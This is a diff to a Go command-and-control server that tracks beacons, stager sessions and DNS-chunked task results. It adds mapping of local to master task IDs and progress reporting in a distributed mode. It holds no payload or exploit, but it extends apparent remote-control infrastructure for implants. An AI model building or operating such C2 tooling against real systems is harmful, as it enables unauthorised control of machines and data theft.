@@ -84,6 +84,7 @@ type StagerSession struct {
 type C2Manager struct {
 	beacons         map[string]*Beacon
 	tasks           map[string]*Task
+	masterTaskIDs   map[string]string          // key: local taskID, value: master taskID
 	resultChunks    map[string][]ResultChunk   // key: taskID (legacy)
 	expectedResults map[string]*ExpectedResult // key: taskID (new two-phase)
 	stagerSessions  map[string]*StagerSession  // key: clientIP
@@ -114,6 +115,7 @@ func NewC2Manager(debug bool, encryptionKey string, jitterConfig StagerJitter, d
 	c2 := &C2Manager{
 		beacons:         make(map[string]*Beacon),
 		tasks:           make(map[string]*Task),
+		masterTaskIDs:   make(map[string]string),
 		resultChunks:    make(map[string][]ResultChunk),
 		expectedResults: make(map[string]*ExpectedResult),
 		stagerSessions:  make(map[string]*StagerSession),
@@ -1037,10 +1039,28 @@ func (c2 *C2Manager) handleResult(parts []string, isDuplicate bool) string {
 	// Report result to Master Server (if in distributed mode)
 	if masterClient != nil {
 		go func(tid, bid, res string) {
-			if err := masterClient.SubmitResult(tid, bid, 0, 1, res); err != nil {
+			// Get the master task ID
+			c2.mutex.RLock()
+			masterTaskID, hasMasterID := c2.masterTaskIDs[tid]
+			c2.mutex.RUnlock()
+
+			// Use master task ID if available, otherwise use local ID
+			submitTaskID := tid
+			if hasMasterID {
+				submitTaskID = masterTaskID
+			}
+
+			if err := masterClient.SubmitResult(submitTaskID, bid, 0, 1, res); err != nil {
 				if c2.debug {
 					logf("[C2] Failed to submit result to master: %v", err)
 				}
+			}
+
+			// Clean up master task ID mapping after successful submission
+			if hasMasterID {
+				c2.mutex.Lock()
+				delete(c2.masterTaskIDs, tid)
+				c2.mutex.Unlock()
 			}
 		}(taskID, beaconID, result)
 	}
@@ -1204,6 +1224,33 @@ func (c2 *C2Manager) handleData(parts []string, isDuplicate bool) string {
 	if !isDuplicate && (receivedCount%10 == 0 || complete) {
 		logf("[C2] Progress: %d/%d chunks received for %s (task %s)",
 			receivedCount, expected.TotalChunks, beaconID, taskID)
+
+		// Report progress to Master Server (if in distributed mode)
+		// Now useful since chunks are distributed across DNS servers
+		if masterClient != nil {
+			go func(tid, bid string, received, total int) {
+				// Get the master task ID
+				c2.mutex.RLock()
+				masterTaskID, hasMasterID := c2.masterTaskIDs[tid]
+				c2.mutex.RUnlock()
+
+				submitTaskID := tid
+				if hasMasterID {
+					submitTaskID = masterTaskID
+				}
+
+				status := "receiving"
+				if received == total {
+					status = "complete"
+				}
+
+				if err := masterClient.SubmitProgress(submitTaskID, bid, received, total, status); err != nil {
+					if c2.debug {
+						logf("[C2] Failed to submit progress to master: %v", err)
+					}
+				}
+			}(taskID, beaconID, receivedCount, expected.TotalChunks)
+		}
 	}
 
 	if complete {
@@ -1245,14 +1292,32 @@ func (c2 *C2Manager) handleData(parts []string, isDuplicate bool) string {
 		// Master will also reassemble from individual chunks, but this provides redundancy
 		if masterClient != nil && taskExists {
 			go func(tid, bid, res string, totalChunks int) {
+				// Get the master task ID
+				c2.mutex.RLock()
+				masterTaskID, hasMasterID := c2.masterTaskIDs[tid]
+				c2.mutex.RUnlock()
+
+				// Use master task ID if available, otherwise use local ID
+				submitTaskID := tid
+				if hasMasterID {
+					submitTaskID = masterTaskID
+				}
+
 				// Send with chunk_index=0 and total_chunks set to actual count
 				// Master will recognize this as the complete assembled result
-				if err := masterClient.SubmitResult(tid, bid, 0, totalChunks, res); err != nil {
+				if err := masterClient.SubmitResult(submitTaskID, bid, 0, totalChunks, res); err != nil {
 					if c2.debug {
 						logf("[C2] Failed to submit assembled result to master: %v", err)
 					}
 				} else if c2.debug {
 					logf("[C2] Submitted assembled result to master: %d chunks, %d bytes", totalChunks, len(res))
+				}
+
+				// Clean up master task ID mapping after successful submission
+				if hasMasterID {
+					c2.mutex.Lock()
+					delete(c2.masterTaskIDs, tid)
+					c2.mutex.Unlock()
 				}
 			}(taskID, beaconID, result, expected.TotalChunks)
 		}
@@ -1262,7 +1327,18 @@ func (c2 *C2Manager) handleData(parts []string, isDuplicate bool) string {
 		// Report chunk to Master Server (if in distributed mode) - for progress tracking
 		if masterClient != nil {
 			go func(tid, bid string, chunk int, total int, data string) {
-				if err := masterClient.SubmitResult(tid, bid, chunk, total, data); err != nil {
+				// Get the master task ID
+				c2.mutex.RLock()
+				masterTaskID, hasMasterID := c2.masterTaskIDs[tid]
+				c2.mutex.RUnlock()
+
+				// Use master task ID if available, otherwise use local ID
+				submitTaskID := tid
+				if hasMasterID {
+					submitTaskID = masterTaskID
+				}
+
+				if err := masterClient.SubmitResult(submitTaskID, bid, chunk, total, data); err != nil {
 					if c2.debug {
 						logf("[C2] Failed to submit chunk %d/%d to master: %v", chunk, total, err)
 					}
@@ -1508,6 +1584,47 @@ func (c2 *C2Manager) AddTask(beaconID, command string) string {
 	}
 
 	logf("[C2] ERROR: Beacon %s not found when adding task %s", beaconID, taskID)
+	return ""
+}
+
+// AddTaskFromMaster adds a task received from the master server
+// It tracks both the local task ID and the master's task ID for result submission
+func (c2 *C2Manager) AddTaskFromMaster(masterTaskID, beaconID, command string) string {
+	c2.mutex.Lock()
+	defer c2.mutex.Unlock()
+
+	// Generate local task ID
+	c2.taskCounter++
+	localTaskID := fmt.Sprintf("T%04d", c2.taskCounter)
+
+	task := &Task{
+		ID:        localTaskID,
+		BeaconID:  beaconID,
+		Command:   command,
+		Status:    "pending",
+		CreatedAt: time.Now(),
+	}
+
+	c2.tasks[localTaskID] = task
+	c2.masterTaskIDs[localTaskID] = masterTaskID // Track master task ID
+
+	// Save task to database (async to avoid blocking)
+	if c2.db != nil {
+		go func(t *Task) {
+			if err := c2.db.SaveTask(t); err != nil && c2.debug {
+				logf("[C2] Failed to save task to database: %v", err)
+			}
+		}(task)
+	}
+
+	// Add to beacon's task queue
+	if beacon, exists := c2.beacons[beaconID]; exists {
+		beacon.TaskQueue = append(beacon.TaskQueue, *task)
+		logf("[C2] Added task %s (master: %s) for beacon %s: %s", localTaskID, masterTaskID, beaconID, command)
+		return localTaskID
+	}
+
+	logf("[C2] ERROR: Beacon %s not found when adding task %s", beaconID, localTaskID)
 	return ""
 }
 
